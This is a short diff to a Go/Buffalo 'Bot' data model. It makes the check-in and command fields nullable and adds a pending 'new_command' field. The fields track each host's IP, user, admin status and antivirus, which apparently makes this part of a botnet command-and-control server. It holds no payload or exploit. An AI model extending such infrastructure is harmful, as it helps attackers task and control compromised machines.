@@ -4,6 +4,8 @@ import (
 	"encoding/json"
 	"time"
 
+	"github.com/gobuffalo/pop/nulls"
+
 	"github.com/gobuffalo/pop"
 	"github.com/gobuffalo/validate"
 	"github.com/gobuffalo/validate/validators"
@@ -11,20 +13,21 @@ import (
 )
 
 type Bot struct {
-	ID          uuid.UUID `json:"id" db:"id"`
-	CreatedAt   time.Time `json:"created_at" db:"created_at"`
-	UpdatedAt   time.Time `json:"updated_at" db:"updated_at"`
-	IP          string    `json:"ip" db:"ip"`
-	WhoAmI      string    `json:"whoami" db:"whoami"`
-	OS          string    `json:"os" db:"os"`
-	InstallDate string    `json:"install_date" db:"install_date"`
-	Admin       string    `json:"admin" db:"admin"`
-	AV          string    `json:"av" db:"av"`
-	CPU         string    `json:"cpu" db:"cpu"`
-	GPU         string    `json:"gpu" db:"gpu"`
-	Version     string    `json:"version" db:"version"`
-	LastCheckin string    `json:"last_checkin" db:"last_checkin"`
-	LastCommand string    `json:"last_command" db:"last_command"`
+	ID          uuid.UUID    `json:"id" db:"id"`
+	CreatedAt   time.Time    `json:"created_at" db:"created_at"`
+	UpdatedAt   time.Time    `json:"updated_at" db:"updated_at"`
+	IP          string       `json:"ip" db:"ip"`
+	WhoAmI      string       `json:"whoami" db:"whoami"`
+	OS          string       `json:"os" db:"os"`
+	InstallDate string       `json:"install_date" db:"install_date"`
+	Admin       string       `json:"admin" db:"admin"`
+	AV          string       `json:"av" db:"av"`
+	CPU         string       `json:"cpu" db:"cpu"`
+	GPU         string       `json:"gpu" db:"gpu"`
+	Version     string       `json:"version" db:"version"`
+	LastCheckin nulls.String `json:"last_checkin" db:"last_checkin"`
+	LastCommand nulls.String `json:"last_command" db:"last_command"`
+	NewCommand  nulls.String `json:"new_command" db:"new_command"`
 }
 
 // String is not required by pop and may be deleted
@@ -55,8 +58,6 @@ func (b *Bot) Validate(tx *pop.Connection) (*validate.Errors, error) {
 		&validators.StringIsPresent{Field: b.CPU, Name: "CPU"},
 		&validators.StringIsPresent{Field: b.GPU, Name: "GPU"},
 		&validators.StringIsPresent{Field: b.Version, Name: "Version"},
-		&validators.StringIsPresent{Field: b.LastCheckin, Name: "LastCheckin"},
-		&validators.StringIsPresent{Field: b.LastCommand, Name: "LastCommand"},
 	), nil
 }
 
